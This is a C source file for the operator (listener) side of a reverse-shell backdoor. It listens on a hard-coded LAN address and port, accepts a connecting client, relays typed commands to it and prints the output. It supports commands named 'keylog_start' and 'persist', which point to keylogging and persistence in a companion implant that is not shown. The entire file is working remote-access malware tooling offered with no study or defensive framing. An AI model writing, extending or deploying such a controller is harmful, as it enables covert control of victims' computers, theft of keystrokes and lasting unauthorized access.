#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h> // Please note these last 3 headers are 
#include <netinet/in.h> // Unix headers and this will not 
#include <arpa/inet.h>  // run on a Windows machine

int main() {
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_length;

    // Create a socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Set socket options for reusing the address
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        printf("Error Setting TCP Socket Options!\n");
        return 1;
    }

    // Configure server address
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.1.240"); // Server IP address
    server_address.sin_port = htons(50005); // Server port

    // Bind the socket to the server address
    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));

    // Listen for incoming connections
    listen(sock, 5);
    client_length = sizeof(client_address);

    // Accept a client connection
    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);

    while (1) {
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));

        // Display the shell prompt
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
        
        // Read user input
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n"); // Remove newline character
        
        // Send the user input to the client
        write(client_socket, buffer, sizeof(buffer));

        // Check for specific commands
        if (strncmp("q", buffer, 1) == 0) {
            break; // Exit the loop
        } else if (strncmp("cd ", buffer, 3) == 0) {
            goto jump; // Go back to displaying the shell prompt
        } else if (strncmp("keylog_start", buffer, 12) == 0) {
            goto jump; // Go back to displaying the shell prompt
        } else if (strncmp("persist", buffer, 7) == 0) {
            // Receive and print response from the client
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response);
        } else {
            // Receive and print response from the client
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }

}